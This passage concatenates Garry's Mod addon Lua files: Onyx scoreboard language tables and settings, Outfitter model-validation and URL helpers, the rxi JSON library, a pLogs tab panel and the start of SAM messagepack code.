LANG['scoreboard.group_teams.desc'] = '(DarkRP) Grupuj zespoły według kategorii prac'

LANG['scoreboard.colored_players.name'] = 'Koloryzowany Gradient'
LANG['scoreboard.colored_players.desc'] = 'Pokaż gradient kolorów na linii gracza'

LANG['scoreboard.blur.name'] = 'Rozmycie Motywu'
LANG['scoreboard.blur.desc'] = 'Włącz motyw rozmycia'

LANG['scoreboard.scale.name'] = 'Skala Wielkości Ramki'
LANG['scoreboard.scale.desc'] = 'Skaluj wielkość ramki tabeli wyników'

onyx.lang:AddPhrases('polish', LANG)
--PATH addons/____onyx_scoreboard/lua/onyx/modules/scoreboard/languages/cl_ukrainian.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

07/03/2024

--]]

local LANG = {}

-- Phrases
LANG['copied_clipboard'] = 'Скопійовано в буфер обміну'
LANG['scoreboard_search'] = 'Пошук... (Ім\'я/SteamID)'
LANG['you'] = 'Ви'
LANG['friend'] = 'Друг'

-- Columns
LANG['scoreboard_col_team'] = 'Команда'
LANG['scoreboard_col_job'] = 'Професія'
LANG['scoreboard_col_money'] = 'Гроші'
LANG['scoreboard_col_rank'] = 'Ранг'
LANG['scoreboard_col_karma'] = 'Карма'
LANG['scoreboard_col_playtime'] = 'Час'
LANG['scoreboard_col_health'] = 'Здоров\'я'
LANG['scoreboard_col_level'] = 'Рівень'
LANG['scoreboard_col_none'] = 'Пусто'
LANG['scoreboard_col_gang'] = 'Банда'
LANG['scoreboard_col_ashop_badges'] = 'Значки'
LANG['scoreboard_col_faction'] = 'Фракція'

-- Name Effects
LANG['scoreboard_eff_default'] = 'За замовчуванням'
LANG['scoreboard_eff_glow'] = 'Свічення'
LANG['scoreboard_eff_rainbow'] = 'Веселка'

-- Buttons
LANG['scoreboard_btn_profile'] = 'Відкрити профіль'
LANG['scoreboard_btn_freeze'] = 'Заморозити'
LANG['scoreboard_btn_goto'] = 'До гравця'
LANG['scoreboard_btn_bring'] = 'До себе'
LANG['scoreboard_btn_return'] = 'Повернути'
LANG['scoreboard_btn_respawn'] = 'Відродити'
LANG['scoreboard_btn_slay'] = 'Вбити'
LANG['scoreboard_btn_demote'] = 'Звільнити'

-- Words
LANG['rank_id'] = 'Ідентифікатор рангу'
LANG['name'] = 'Назва'
LANG['effect'] = 'Ефект'
LANG['color'] = 'Колір'
LANG['preview'] = 'Передпрогляд'
LANG['creation'] = 'Створення'
LANG['save'] = 'Зберегти'
LANG['dead'] = 'Мертвий'
LANG['create_new'] = 'Створити новий'
LANG['column'] = 'Колона'

-- Settings
LANG['addon_settings_u'] = 'НАЛАШТУВАННЯ'
LANG['scoreboard_ranks_u'] = 'РАНГИ'
LANG['scoreboard_columns_u'] = 'КОЛОНИ'

LANG['scoreboard.title.name'] = 'Заголовок'
LANG['scoreboard.title.desc'] = 'Введіть заголовок для вікна'

LANG['scoreboard.group_teams.name'] = 'Угруповання'
LANG['scoreboard.group_teams.desc'] = '(DarkRP) Групувати професії за категоріями'

LANG['scoreboard.colored_players.name'] = 'Кольоровий градієнт'
LANG['scoreboard.colored_players.desc'] = 'Відображати кольоровий градієнт'

LANG['scoreboard.blur.name'] = 'Blur тема'
LANG['scoreboard.blur.desc'] = 'Увімкнути розмиття заднього фону'

onyx.lang:AddPhrases('ukrainian', LANG)
--PATH addons/____onyx_scoreboard/lua/onyx/modules/scoreboard/core/sh_init.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

28/02/2024

--]]

CAMI.RegisterPrivilege({
    Name = 'onyx_scoreboard_edit',
    MinAccess = 'superadmin',
    Description = 'Allows to configure Onyx Scoreboard'
})

onyx.scoreboard:RegisterOption('title', {
    title = 'scoreboard.title.name',
    desc = 'scoreboard.title.desc',
    category = 'General',
    cami = 'onyx_scoreboard_edit',
    type = 'string',
    default = 'ONYX SCOREBOARD'
})

onyx.scoreboard:RegisterOption('scale', {
    title = 'scoreboard.scale.name',
    desc = 'scoreboard.scale.desc',
    category = 'General',
    cami = 'onyx_scoreboard_edit',
    type = 'int',
    default = 100,
    min = 80,
    max = 130
})

onyx.scoreboard:RegisterOption('group_teams', {
    title = 'scoreboard.group_teams.name',
    desc = 'scoreboard.group_teams.desc',
    category = 'General',
    cami = 'onyx_scoreboard_edit',
    type = 'bool',
    default = true
})

onyx.scoreboard:RegisterOption('colored_players', {
    title = 'scoreboard.colored_players.name',
    desc = 'scoreboard.colored_players.desc',
    category = 'General',
    cami = 'onyx_scoreboard_edit',
    type = 'bool',
    default = true
})

onyx.scoreboard:RegisterOption('blur', {
    title = 'scoreboard.blur.name',
    desc = 'scoreboard.blur.desc',
    category = 'General',
    cami = 'onyx_scoreboard_edit',
    type = 'bool',
    default = false
})
--PATH addons/__main/lua/autorun/orangutan.lua:
player_manager.AddValidModel( "Orangutan","models/vedatys/orangutan.mdl" )
player_manager.AddValidHands( "Orangutan", "models/vedatys/c_arms.mdl", 0, "00000000" )
--PATH addons/_outfitter/lua/includes/modules/fileextras.lua:
if SERVER then
	AddCSLuaFile()
end


local File = FindMetaTable"File"

local visit_folders
visit_folders = function(init_path,scope,cb)
	scope = scope or 'GAME'
	
	local stack = {
		init_path,
	}
	
	-- "models/player"
	
	-- "models/player/fld1"
	-- "models/player/fld2"
	
	-- "models/player/fld1/asd"
	-- "models/player/fld1/qwe"
	-- "models/player/fld2"
	
	while stack[1] do
		local entry = stack[1]
		table.remove(stack,1)
		
		local fi,fo = file.Find(entry..'/*.*',scope)
		local ret = cb(entry..'/',fi,fo)
		if ret == nil then
			for k,v in next,fo do
				table.insert(stack,1,entry..'/'..v)
			end
		elseif ret == false then return end
	end
	
end


file.RecurseFolders = visit_folders

local tmp = {}
function File.ReadString(f,n,ch)
	n = n or 256
	ch = ch or '\0'
	local startpos = f:Tell()
	local offset = 0
	local tmpn = 0
	local sz = f:Size()
	
	--TODO: Use n and sz instead
	for i=1,1048576 do
--	while true do
		if f:Tell()>=sz then return nil,"eof" end
		local str = f:Read(n)
		--if not str then return nil,"eof","wtf" end
		local pos = str:find(ch,1,true)
		if pos then
			--offset = offset + pos
			
			--reset position
			f:Seek(startpos+offset+pos)
			
			tmp[tmpn + 1] = str:sub(1,pos - 1)
			return table.concat(tmp,'',1,tmpn+1)
		else
			tmpn = tmpn + 1
			tmp[tmpn] = str
			offset = offset + n
		end
	end
	return nil,"not found"
end
--PATH addons/_outfitter/lua/outfitter/json.lua:
--
-- json.lua
--
-- Copyright (c) 2020 rxi
--
-- Permission is hereby granted, free of charge, to any person obtaining a copy of
-- this software and associated documentation files (the "Software"), to deal in
-- the Software without restriction, including without limitation the rights to
-- use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
-- of the Software, and to permit persons to whom the Software is furnished to do
-- so, subject to the following conditions:
--
-- The above copyright notice and this permission notice shall be included in all
-- copies or substantial portions of the Software.
--
-- THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-- IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-- FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-- AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-- LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-- OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-- SOFTWARE.
--

local json = { _version = "0.1.2" }

-------------------------------------------------------------------------------
-- Encode
-------------------------------------------------------------------------------

local encode

local escape_char_map = {
  [ "\\" ] = "\\",
  [ "\"" ] = "\"",
  [ "\b" ] = "b",
  [ "\f" ] = "f",
  [ "\n" ] = "n",
  [ "\r" ] = "r",
  [ "\t" ] = "t",
}

local escape_char_map_inv = { [ "/" ] = "/" }
for k, v in pairs(escape_char_map) do
  escape_char_map_inv[v] = k
end


local function escape_char(c)
  return "\\" .. (escape_char_map[c] or string.format("u%04x", c:byte()))
end


local function encode_nil(val)
  return "null"
end


local function encode_table(val, stack)
  local res = {}
  stack = stack or {}

  -- Circular reference?
  if stack[val] then error("circular reference") end

  stack[val] = true

  if rawget(val, 1) ~= nil or next(val) == nil then
    -- Treat as array -- check keys are valid and it is not sparse
    local n = 0
    for k in pairs(val) do
      if type(k) ~= "number" then
        error("invalid table: mixed or invalid key types")
      end
      n = n + 1
    end
    if n ~= #val then
      error("invalid table: sparse array")
    end
    -- Encode
    for i, v in ipairs(val) do
      table.insert(res, encode(v, stack))
    end
    stack[val] = nil
    return "[" .. table.concat(res, ",") .. "]"

  else
    -- Treat as an object
    for k, v in pairs(val) do
      if type(k) ~= "string" then
        error("invalid table: mixed or invalid key types")
      end
      table.insert(res, encode(k, stack) .. ":" .. encode(v, stack))
    end
    stack[val] = nil
    return "{" .. table.concat(res, ",") .. "}"
  end
end


local function encode_string(val)
  return '"' .. val:gsub('[%z\1-\31\\"]', escape_char) .. '"'
end


local function encode_number(val)
  -- Check for NaN, -inf and inf
  if val ~= val or val <= -math.huge or val >= math.huge then
    error("unexpected number value '" .. tostring(val) .. "'")
  end
  return string.format("%.14g", val)
end


local type_func_map = {
  [ "nil"     ] = encode_nil,
  [ "table"   ] = encode_table,
  [ "string"  ] = encode_string,
  [ "number"  ] = encode_number,
  [ "boolean" ] = tostring,
}


encode = function(val, stack)
  local t = type(val)
  local f = type_func_map[t]
  if f then
    return f(val, stack)
  end
  error("unexpected type '" .. t .. "'")
end


function json.encode(val)
  return ( encode(val) )
end


-------------------------------------------------------------------------------
-- Decode
-------------------------------------------------------------------------------

local parse

local function create_set(...)
  local res = {}
  for i = 1, select("#", ...) do
    res[ select(i, ...) ] = true
  end
  return res
end

local space_chars   = create_set(" ", "\t", "\r", "\n")
local delim_chars   = create_set(" ", "\t", "\r", "\n", "]", "}", ",")
local escape_chars  = create_set("\\", "/", '"', "b", "f", "n", "r", "t", "u")
local literals      = create_set("true", "false", "null")

local literal_map = {
  [ "true"  ] = true,
  [ "false" ] = false,
  [ "null"  ] = nil,
}


local function next_char(str, idx, set, negate)
  for i = idx, #str do
    if set[str:sub(i, i)] ~= negate then
      return i
    end
  end
  return #str + 1
end


local function decode_error(str, idx, msg)
  local line_count = 1
  local col_count = 1
  for i = 1, idx - 1 do
    col_count = col_count + 1
    if str:sub(i, i) == "\n" then
      line_count = line_count + 1
      col_count = 1
    end
  end
  error( string.format("%s at line %d col %d", msg, line_count, col_count) )
end


local function codepoint_to_utf8(n)
  -- http://scripts.sil.org/cms/scripts/page.php?site_id=nrsi&id=iws-appendixa
  local f = math.floor
  if n <= 0x7f then
    return string.char(n)
  elseif n <= 0x7ff then
    return string.char(f(n / 64) + 192, n % 64 + 128)
  elseif n <= 0xffff then
    return string.char(f(n / 4096) + 224, f(n % 4096 / 64) + 128, n % 64 + 128)
  elseif n <= 0x10ffff then
    return string.char(f(n / 262144) + 240, f(n % 262144 / 4096) + 128,
                       f(n % 4096 / 64) + 128, n % 64 + 128)
  end
  error( string.format("invalid unicode codepoint '%x'", n) )
end


local function parse_unicode_escape(s)
  local n1 = tonumber( s:sub(1, 4),  16 )
  local n2 = tonumber( s:sub(7, 10), 16 )
   -- Surrogate pair?
  if n2 then
    return codepoint_to_utf8((n1 - 0xd800) * 0x400 + (n2 - 0xdc00) + 0x10000)
  else
    return codepoint_to_utf8(n1)
  end
end


local function parse_string(str, i)
  local res = ""
  local j = i + 1
  local k = j

  while j <= #str do
    local x = str:byte(j)

    if x < 32 then
      decode_error(str, j, "control character in string")

    elseif x == 92 then -- `\`: Escape
      res = res .. str:sub(k, j - 1)
      j = j + 1
      local c = str:sub(j, j)
      if c == "u" then
        local hex = str:match("^[dD][89aAbB]%x%x\\u%x%x%x%x", j + 1)
                 or str:match("^%x%x%x%x", j + 1)
                 or decode_error(str, j - 1, "invalid unicode escape in string")
        res = res .. parse_unicode_escape(hex)
        j = j + #hex
      else
        if not escape_chars[c] then
          decode_error(str, j - 1, "invalid escape char '" .. c .. "' in string")
        end
        res = res .. escape_char_map_inv[c]
      end
      k = j + 1

    elseif x == 34 then -- `"`: End of string
      res = res .. str:sub(k, j - 1)
      return res, j + 1
    end

    j = j + 1
  end

  decode_error(str, i, "expected closing quote for string")
end


local function parse_number(str, i)
  local x = next_char(str, i, delim_chars)
  local s = str:sub(i, x - 1)
  local n = tonumber(s)
  if not n then
    decode_error(str, i, "invalid number '" .. s .. "'")
  end
  return n, x
end


local function parse_literal(str, i)
  local x = next_char(str, i, delim_chars)
  local word = str:sub(i, x - 1)
  if not literals[word] then
    decode_error(str, i, "invalid literal '" .. word .. "'")
  end
  return literal_map[word], x
end


local function parse_array(str, i)
  local res = {}
  local n = 1
  i = i + 1
  while 1 do
    local x
    i = next_char(str, i, space_chars, true)
    -- Empty / end of array?
    if str:sub(i, i) == "]" then
      i = i + 1
      break
    end
    -- Read token
    x, i = parse(str, i)
    res[n] = x
    n = n + 1
    -- Next token
    i = next_char(str, i, space_chars, true)
    local chr = str:sub(i, i)
    i = i + 1
    if chr == "]" then break end
    if chr ~= "," then decode_error(str, i, "expected ']' or ','") end
  end
  return res, i
end


local function parse_object(str, i)
  local res = {}
  i = i + 1
  while 1 do
    local key, val
    i = next_char(str, i, space_chars, true)
    -- Empty / end of object?
    if str:sub(i, i) == "}" then
      i = i + 1
      break
    end
    -- Read key
    if str:sub(i, i) ~= '"' then
      decode_error(str, i, "expected string for key")
    end
    key, i = parse(str, i)
    -- Read ':' delimiter
    i = next_char(str, i, space_chars, true)
    if str:sub(i, i) ~= ":" then
      decode_error(str, i, "expected ':' after key")
    end
    i = next_char(str, i + 1, space_chars, true)
    -- Read value
    val, i = parse(str, i)
    -- Set
    res[key] = val
    -- Next token
    i = next_char(str, i, space_chars, true)
    local chr = str:sub(i, i)
    i = i + 1
    if chr == "}" then break end
    if chr ~= "," then decode_error(str, i, "expected '}' or ','") end
  end
  return res, i
end


local char_func_map = {
  [ '"' ] = parse_string,
  [ "0" ] = parse_number,
  [ "1" ] = parse_number,
  [ "2" ] = parse_number,
  [ "3" ] = parse_number,
  [ "4" ] = parse_number,
  [ "5" ] = parse_number,
  [ "6" ] = parse_number,
  [ "7" ] = parse_number,
  [ "8" ] = parse_number,
  [ "9" ] = parse_number,
  [ "-" ] = parse_number,
  [ "t" ] = parse_literal,
  [ "f" ] = parse_literal,
  [ "n" ] = parse_literal,
  [ "[" ] = parse_array,
  [ "{" ] = parse_object,
}


parse = function(str, idx)
  local chr = str:sub(idx, idx)
  local f = char_func_map[chr]
  if f then
    return f(str, idx)
  end
  decode_error(str, idx, "unexpected character '" .. chr .. "'")
end


function json.decode(str)
  if type(str) ~= "string" then
    error("expected argument of type string, got " .. type(str))
  end
  local res, idx = parse(str, next_char(str, 1, space_chars, true))
  idx = next_char(str, idx, space_chars, true)
  if idx <= #str then
    decode_error(str, idx, "trailing garbage")
  end
  return res
end


return json

--PATH addons/_outfitter/lua/outfitter/sh.lua:
local Tag = 'outfitter'
module(Tag, package.seeall)
local outfitter_sv_distance = CreateConVar("outfitter_sv_distance", "1", {FCVAR_REPLICATED, FCVAR_ARCHIVE, FCVAR_NOTIFY})

function ServerSuggestDistance()
	return outfitter_sv_distance:GetBool()
end

-- Shared Utils
function UrlToWorkshopID(url,numok)
	if not url or not isstring(url) then return end
	

	local ret = url:match'://steamcommunity.com/sharedfiles/filedetails/.*[%?%&]id=(%d+)' or url:match'://steamcommunity.com/workshop/filedetails/.*[%?%&]id=(%d+)'
	if ret then return ret end
	if numok and tonumber(url:Trim()) then
		local num = tonumber(url:Trim())
		if num and num>1337 then return num end
	end
end

function HasMDL(mdl)
	mdl = mdl:gsub("%.mdl$", "")

	return file.Exists(mdl .. '.mdl', 'GAME')
end

function SanityCheckNData(mdl, download_path)
	if not mdl then return false end
	if not download_path then return false end
	if mdl == "" or #mdl > 2048 * 2 then return false end
	if mdl:find("  ", 1, true) or mdl:find("..", 1, true) or mdl:find("\t", 1, true) or mdl:find("\n", 1, true) then return false end

	if tonumber(download_path) then
		if tonumber(download_path) <= 0 then return false end
	else
		if not IsHTTPURL(download_path) then return false end
	end

	return nil
end

-- Find player by userid
function findpl(uid)
	for _, pl in next, player.GetAll() do
		if pl:UserID() == uid then return pl end
	end
end

-- Encodes the shared payload to be sent to everyone: {model_path,25293523 or "https://example.com/asd.gma" or false}
function EncodeOutfitterPayload(model_path, download_path)
	local encoded = model_path and download_path and util.TableToJSON({assert(model_path:find(".mdl", 2, true) and model_path, 'invalid path: ' .. tostring(model_path)), tostring(download_path) or false}) or nil

	return encoded and #encoded < 32000 and encoded
end

function IsHTTPURL(str)
	return tostring(str or ""):find"^https?://.*/" and true or false
end

-- Decodes the shared payload
function DecodeOutfitterPayload(encoded)
	if not encoded or #encoded == 0 then return nil, 'empty' end
	local decoded = util.JSONToTable(encoded)
	if not decoded then return nil, err or 'json parsing failed' end
	local model_path = decoded[1]
	local download_path = decoded[2]
	if not model_path then return nil, 'empty' end
	model_path = tostring(model_path)
	if not model_path:find("%.mdl$") and not model_path:lower():find("%.mdl$") then return nil, 'not a .mdl' end
	
	-- either workshop id or a http url
	if download_path == nil then return nil, 'empty' end
	if not tonumber(download_path) and not download_path:find"^https?://.*/" and download_path ~= false then return nil, 'invalid' end

	return model_path, download_path
end

-- legacy
EncodeOW = EncodeOutfitterPayload
DecodeOW = DecodeOutfitterPayload

net.Receive(Tag, function(...)
	if this.OnReceive then
		OnReceive(...)
	end
end)

-- parse model from file
function MDLIsPlayermodel(f, sz)
	local mdl, err, err2 = mdlinspect.Open(f)
	if not mdl then return nil, err, err2 end
	if mdl.version < 44 or mdl.version > 49 then return false, "bad model version" end
	local ok, err = mdl:ParseHeader()
	if not ok then return false, err or "hdr" end
	if not mdl.bone_count or mdl.bone_count <= 2 then return false, "nobones" end

	if sz then
		local valid, err = mdl:Validate(sz)

		if not valid then
			dbg("MDLIsPlayermodel", f, "validate error", err)

			return false, "valid"
		end
	end

	--print(mdl,mdl.bodypart_count,mdl.skinreference_count)
	local found = false
	local imdls = mdl:IncludedModels()
	
	if mdl.bonecontroller_count ~= mdl.bone_count then
		--dbg("bonecontroller_count differs?!",mdl.bonecontroller_count,mdl.bone_count)
	end
	
	local found
	local found_anm
	for k,v in next,imdls do
		v=v[2]
		
		if v and v:find("_arms_",1,true) then
			return false,"arms"
		end
		
		if v and not v:find"%.mdl$" then
			return false,"badinclude",v
		end
		if v=="models/m_anm.mdl" or v=="models/f_anm.mdl" or v=="models/z_anm.mdl" then
			found_anm = true
		end
		--if v
		--	and v:find"%.mdl$"
		--	and (
		--		v:find("anim",1,true)
		--		or v:find('/m_',1,true)
		--		or v:find('/f_',1,true)
		--		or v:find('/cs_',1,true) )
		--then
		--	found = true
		--	break
		--end
	end
	
	local attachments = mdl:Attachments()
	if not attachments or not next(attachments) then
		if not found_anm then
			--PrintTable(mdl:Attachments())
			if not IsUnsafe() then
				return false,"noattachments"
			end
		else
			dbg("MDLIsPlayermodel",mdl.name,"no attachments but included")
		end
	else
		--PrintTable("ASD",mdl:BoneNames())
		local found
		for k,v in next,attachments do
			local name = v[1]
			--print(name)
			if name=="eyes" or name=="anim_attachment_head" or name=="mouth" or name=="anim_attachment_RH" or name=="anim_attachment_LH" then found=true break end
		end
		if not found then
			if not found_anm then
				--PrintTable(mdl:Attachments())
				if not IsUnsafe() then
					return false,"attachments"
				end
			else
				dbg("MDLIsPlayermodel",mdl.name,"no attachments but included")
			end
		end
		
	end
	-- UNDONE: guess why
	--if not found then
	--	return false,"includemdls"
	--end
	--UNDONE: Bones are named all over the place
	--local bname = mdl:BoneNames() [1]
	--if not bname or (	not bname:lower():find("pelvis",1,true)
	--					and bname~="Root"
	--					and bname~="pelvis"
	--					and bname~="hip"
	--					and bname~="root")
	--then
	--	return false,"bones",bname
	--end

	return true, found_anm
end

local badbones = {
	["valvebiped.bip01_r_foot"] = true,
	["valvebiped.bip01_head1"] = true,
	["valvebiped.bip01_head"] = true
}

local spines = {
	["valvebiped.bip01_spine4"] = true,
	["valvebiped.bip01_spine3"] = true,
	["valvebiped.bip01_spine2"] = true,
	["valvebiped.bip01_spine1"] = true
}

local findone = {
	["valvebiped.bip01_r_clavicle"] = true,
	["valvebiped.bip01_r_upperarm"] = true,
	["valvebiped.bip01_r_forearm"] = true,
	["valvebiped.bip01_r_hand"] = true,
	["valvebiped.bip01_l_hand"] = true
}

-- parse model from file
function MDLIsHands(f, sz)
	local mdl, err, err2 = mdlinspect.Open(f)
	if not mdl then return nil, err, err2 end
	if mdl.version < 44 or mdl.version > 49 then return false, "version" end
	local ok, err = mdl:ParseHeader()
	if not ok then return false, err or "hdr" end
	if not mdl.bone_count or mdl.bone_count <= 2 then return false, "nobones" end

	if sz then
		local valid, err = mdl:Validate(sz)

		if not valid then
			dbg("MDLIsHands", f, "validate error", err)

			return false, "valid"
		end
	end

	--print(mdl,mdl.bodypart_count,mdl.skinreference_count)
	local found = false
	local imdls = mdl:IncludedModels()
	--TODO: include stuff or have animations (seqs)
	local found_anm

	for k, v in next, imdls do
		v = v[2]
		if v == "models/m_anm.mdl" then return false, "player" end
		--print("----------------",v)
		if v and not v:find"%.mdl$" then return false, "badinclude", v end

		if v:find("/c_arms_", 1, true) then
			found_anm = true
		end
	end

	local bonenames = mdl:BoneNames()
	local hadspine
	local gotone

	for _, name in next, bonenames do
		name = name:lower()
		--print(name)
		local isspine = spines[name]

		if isspine then 
			if hadspine then
				--return false,'bones',name
			end 
			hadspine = true
		end

		
		gotone = gotone or findone[name]
		if badbones[name] then return false, 'bones', name end
	end

	if not gotone or not hadspine then return false, 'bones' end
	local attachments = mdl:Attachments()

	if attachments and next(attachments) then
		for k, v in next, attachments do
			local name = v[1]
			--print(name)
			if name == "eyes" or name == "anim_attachment_head" or name == "mouth" then return false, "player" end
		end
	end

	return true
end

--[[
local fp ="models/player/"
local flist = file.Find(fp..'*.mdl','GAME')
-- flist = {'matress.mdl'}

for _,fn in next,flist do

	local fpath = fp..fn
	local f = file.Open(fpath,'rb','GAME')
	print(('%50s'):format(fn),MDLIsPlayermodel(f))
	f:Close()
	
end--]]
local t = {"", "", "", ""}

local function GenID(_1, _2, _3, _4, _5)
	if not _1 then return end
	t[1] = _1
	t[2] = tostring(_2)
	t[3] = tostring(_3)
	t[4] = tostring(_4)
	assert(not _5)

	return table.concat(t, "|")
end

local Player = FindMetaTable"Player"

function Player.OutfitHash(pl)
	return pl.outfitter_latest
end

function Player.OutfitUpdateHash(pl)
	local hash = GenID(pl:OutfitInfo())
	pl.outfitter_latest = hash

	return hash
end

function Player.OutfitCheckHash(pl, nhash)
	local cur = pl:OutfitHash()
	cur = cur or false
	nhash = nhash or false

	return cur == nhash
end

function Player.OutfitInfo(pl)
	return pl.outfitter_mdl, pl.outfitter_download_path, pl.outfitter_skin, pl.outfitter_bodygroups
end

function Player.OutfitSetInfo(pl, mdl, download_path, skin, bodygroups)
	pl.outfitter_mdl = mdl
	pl.outfitter_download_path = download_path
	pl.outfitter_skin = skin
	pl.outfitter_bodygroups = bodygroups
	pl:OutfitUpdateHash()
end

local function filt(ok, err, ...)
	if not ok then
		ErrorNoHalt(err .. '\n')

		return nil
	end

	return err, ...
end

function SafeRunHook(...)
	return filt(xpcall(hook.Run, debug.traceback, ...))
end

--- Crashing code detector thingy
--TODO: Stack, blacklist of files
function InitCrashSys()
	local Tag = Tag .. '_blacklist'
	local CrashingTagk = Tag .. 'ing2k'
	local CrashingTagv = Tag .. 'ing2v'

	local function SAVE(t)
		local s = json.encode(t)
		util.SetPData("0", Tag, s)
	end

	local function LOAD()
		local s = util.GetPData("0", Tag, false)
		if not s or s == "" or s == "nil" then return {} end
		local ok,t = pcall(json.decode,s)
		if not ok or not t then return {} end

		return t
	end

	local crashlist = LOAD() or {}

	function GetCrashList()
		return crashlist
	end

	local function SaveList()
		SAVE(crashlist)
	end

	if CLIENT then
		concommand.Add(Tag .. "_clear", function()
			local n = table.Count(crashlist)
			table.Empty(crashlist)
			SAVE()
			chat.AddText("Cleared blacklist (had " .. n .. ")")
		end)

		concommand.Add(Tag .. "_dump", function()
			PrintTable(crashlist)
		end)
	end

	function DidCrash(key, val)
		if IsUnsafe() or not AutoblacklistEnabled() then return false end
		local t = crashlist[key]

		return t and t[val]
	end

	function CRITICAL(a, b)
		util.SetPData("0", CrashingTagk, a or "")
		if not a or a == "" then return end
		util.SetPData("0", CrashingTagv, b)
	end

	-- check for crashes
	local key = util.GetPData("0", CrashingTagk, false)
	if not key or key == "" then return end
	local val = util.GetPData("0", CrashingTagv, "")
	local err = ("[%s] CRASH: %s on %q\n"):format(Tag, tostring(key), tostring(val))
	local t = crashlist[key]

	if not t then
		t = {}
		crashlist[key] = t
	end

	local curval = t[val]
	t[val] = (t[val] and tonumber(t[val]) or 0) + 1
	SaveList()
	SetFailsafe()

	util.OnInitialize(function()
		ErrorNoHalt(err)
	end)
end

if CLIENT then
	InitCrashSys()
end

function MakeURLDownloadable(url)
	url = url:Trim()

	if url:find("dropbox", 4, true) then
		url = url:gsub([[^http%://dl%.dropboxusercontent%.com/]], [[https://dl.dropboxusercontent.com/]])
		url = url:gsub([[^https?://dl.dropbox.com/]], [[https://www.dropbox.com/]])
		url = url:gsub([[^https?://www.dropbox.com/s/(.+)%?dl%=[01]$]], [[https://dl.dropboxusercontent.com/s/%1]])
		url = url:gsub([[^https?://www.dropbox.com/s/(.+)$]], [[https://dl.dropboxusercontent.com/s/%1]])
	end

	if url:find("drive.google.com", 4, true) and not url:find("export=download", 4, true) then
		local id = url:match("https://drive.google.com/file/d/(.-)/") or url:match("https://drive.google.com/file/d/(.-)$") or url:match("https://drive.google.com/open%?id=(.-)$")
		if id then return "https://drive.google.com/uc?export=download&id=" .. id end
	end

	if url:find("gitlab.com", 1, true) then
		url = url:gsub("^(https?://.-/.-/.-/)blob", "%1raw")
	end

	url = url:gsub([[^http%://onedrive%.live%.com/redir?]], [[https://onedrive.live.com/download?]])
	url = url:gsub("pastebin%.com/([a-zA-Z0-9]*)$", "pastebin.com/raw.php?i=%1")
	url = url:gsub("github%.com/([a-zA-Z0-9_]+)/([a-zA-Z0-9_]+)/blob/", "github.com/%1/%2/raw/")

	return url
end
--PATH addons/____plogs/lua/plogs/vgui/tablist.lua:
--[[
addons/lgos/lua/plogs/vgui/tablist.lua
--]]
local PANEL = {}

function PANEL:Init()
	self.num = 0
	self.tablist = vgui.Create('onyx.ScrollPanel', self)
	self:SetSkin('pLogs')
end

function PANEL:AddTab(title, tab, active)
	if active then 
		self.CurrentTab = tab 
	else
		tab:SetVisible(false)
	end

	if (tab:GetParent() ~= self) then
		tab:SetParent(self)
		tab:SetSkin(self:GetSkin())
	end

	tab:SetPos(149, 0)
	tab:SetSize(self:GetWide() - 149, self:GetTall())

	local button = vgui.Create('onyx.Button')
	button:SetSize(150, 30)
	button:SetPos(0, 32 * self.num)
	button:SetText(title)
	button.DoClick = function()
		self.CurrentButton.Active = false
		self.CurrentTab:SetVisible(false)
		tab:SetVisible(true)

		self.CurrentTab = tab
		self.CurrentButton = button
		button.Active = true
	end

	if active then
		self.CurrentButton = button
		button.Active = true
		self.CurrentTab = tab
	end

	self.tablist:AddPanel(button)

	self.num = self.num + 1
end

function PANEL:AddButton(title, func)
	local button = vgui.Create('onyx.Button')
	button:SetSize(150, 30)
	button:SetPos(0, 29 * self.num)
	button:SetText(title)
	button.DoClick = function(self)
		func(self)
	end

	self.tablist:AddPanel(button)

	self.num = self.num + 1
end

function PANEL:PerformLayout()
	self.tablist:SetSize(150, self:GetTall())
	self.tablist:SetPos(0, 0)
end

vgui.Register('plogs_tablist', PANEL, 'Panel')


--PATH addons/____sam/lua/sam/libs/sh_mp.lua:
if SAM_LOADED then return end

local sam = sam
local mp = sam.load_file("sam/libs/message_pack/sh_messagepack.lua")
local EXT_VECTOR  = 1
local EXT_ANGLE   = 2
local EXT_ENTITY  = 3
local EXT_PLAYER  = 4
local EXT_COLOR   = 5
local EXT_CONSOLE = 6

mp.packers["Entity"] = function(buffer, ent)
	local buf = {}
	mp.packers["number"](buf, ent:EntIndex())
	mp.packers["ext"](buffer, EXT_ENTITY, buf[1])
end
mp.packers["Vehicle"] = mp.packers["Entity"]
mp.packers["Weapon"] = mp.packers["Entity"]
mp.packers["NPC"] = mp.packers["Entity"]
mp.packers["NextBot"] = mp.packers["Entity"]
mp.packers["PhysObj"] = mp.packers["Entity"]

mp.packers["Player"] = function(buffer, ply)
	local buf = {}
	mp.packers["number"](buf, ply:UserID())
	mp.packers["ext"](buffer, EXT_PLAYER, buf[1])
end

local VECTOR = {}
mp.packers["Vector"] = function(buffer, vec)
	VECTOR[1] = vec.x
	VECTOR[2] = vec.y
	VECTOR[3] = vec.z

	local buf = {}
	mp.packers["_table"](buf, VECTOR)
	mp.packers["ext"](buffer, EXT_VECTOR, table.concat(buf))
end

local ANGLE = {}
mp.packers["Angle"] = function(buffer, ang)
	ANGLE[1] = ang.p
	ANGLE[2] = ang.y
	ANGLE[3] = ang.r

	local buf = {}
	mp.packers["_table"](buf, ANGLE)
	mp.packers["ext"](buffer, EXT_ANGLE, table.concat(buf))
end

local COLOR = {}
mp.packers["Color"] = function(buffer, col)
	COLOR[1] = col.r
	COLOR[2] = col.g
	COLOR[3] = col.b
	COLOR[4] = col.a

	local buf = {}
	mp.packers["_table"](buf, COLOR)
	mp.packers["ext"](buffer, EXT_COLOR, table.concat(buf))
end

mp.packers["console"] = function(buffer)
	mp.packers["ext"](buffer, EXT_CONSOLE, "")
end

local Entity = Entity
local Player = Player
local Color = Color
local Vector = Vector
local Angle = Angle
local unpackers = {
	[EXT_ENTITY] = function(v)
